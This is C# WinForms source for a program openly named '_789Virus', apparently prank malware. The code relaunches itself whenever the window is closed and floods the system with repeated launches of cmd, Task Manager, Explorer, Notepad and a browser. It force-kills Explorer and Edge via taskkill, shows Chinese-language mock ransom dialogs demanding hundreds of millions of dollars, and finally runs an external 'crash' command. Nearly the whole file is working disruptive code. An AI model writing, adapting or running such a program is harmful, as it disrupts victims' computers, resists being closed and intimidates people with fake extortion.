using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using _789Virus.Forms;
using FileBinaryHelper;
using FunctionsHelper;
using HashHelper;
using InputManager;
using MemoryHelper;

namespace _789Virus
{
    public partial class Main_Form : Form
    {
        public static string[] args = Environment.GetCommandLineArgs();
        public Main_Form()
        {
            InitializeComponent();

            
            

        }

        private void Main_Form_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (args.Length == 2)
            {
                if (args[1] == "error")
                {
                    MessageBox.Show($"这是你自找的...", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Process.Start(Assembly.GetExecutingAssembly().Location, "launch");
                }
            }
            else
            {
                MessageBox.Show("你又忘了我告诉你的东西?", "789", MessageBoxButtons.OK, MessageBoxIcon.Warning);

                Process.Start(Assembly.GetExecutingAssembly().Location, "error");
            }
                
        }

        private void button_NO_Click(object sender, EventArgs e)
        {
            if (args.Length == 2)
            {
                if (args[1] == "error")
                {
                    button_NO.Enabled = false;
                    button_NO.Text = "你别无选择";
                }
            }
            else
            {
                this.Close();

            }
        }

        private async void Main_Form_Load(object sender, EventArgs e)
        {
            if (args.Length == 2)
            {
                if (args[1] == "error")
                {
                    pictureBox1.Image = Properties.Resources._9e3df8dcd100baa1a5fd20114d10b912c9fc2e42___副本;
                    pictureBox2.Image = Properties.Resources.Snipaste_2025_09_13_16_22_02;
                    pictureBox3.Image = _789Virus.Properties.Resources.Snipaste_2025_09_13_16_21_57;
                    this.BackColor = Color.FromArgb(192, 0, 0);
                }
                else if (args[1] == "launch")
                {
                    bool temp = false;
                    long timer = 0;
                    while (timer <= 1000) 
                    {
                        timer++;
                        if (timer % 50 == 0)
                        {
                            Process.Start("cmd.exe");
                            Process.Start("taskmgr.exe");

                        }
                        if (timer % 100 == 0)
                        {
                            Process.Start("explorer.exe");
                        }
                        if (timer % 200 == 0)
                        {
                            Process.Start("notepad.exe");
                        }
                        if (timer % 250 == 0)
                        {
                            Process.Start("http://127.0.0.1");
                        }
                            await Task.Delay(1);

                        if (timer >= 500) 
                        {
                            if (!temp)
                            {
                                temp = true;
                                using (var window = new tip())
                                {
                                    window.Show();
                                }
                            }
                            
                        }
                    }

                    Process.Start("cmd.exe", "/c taskkill /f /im cmd.exe");
                    Process.Start("cmd.exe", "/c taskkill /f /im explorer.exe");
                    Process.Start("cmd.exe", "/c taskkill /f /im taskmgr.exe");
                    Process.Start("cmd.exe", "/c taskkill /f /im notepad.exe");
                    Process.Start("cmd.exe", "/c taskkill /f /im msedge.exe");

                    MessageBox.Show("我再给你最后一次机会", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    MessageBox.Show("你到底交不交4/2亿美元", "", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                    MessageBox.Show("我不会再给你任何机会了", "", MessageBoxButtons.OK, MessageBoxIcon.Error);

                    for (int i = 0; i < 10; i++)
                    {
                        Process.Start("cmd.exe");
                        Process.Start("taskmgr.exe");
                        Process.Start("explorer.exe");
                        Process.Start("notepad.exe");
                        Process.Start("http://127.0.0.1");

                        await Task.Delay(1);
                    }

                    Process.Start("nmf.exe", "/crash");
                }
            }
        }
    }
}
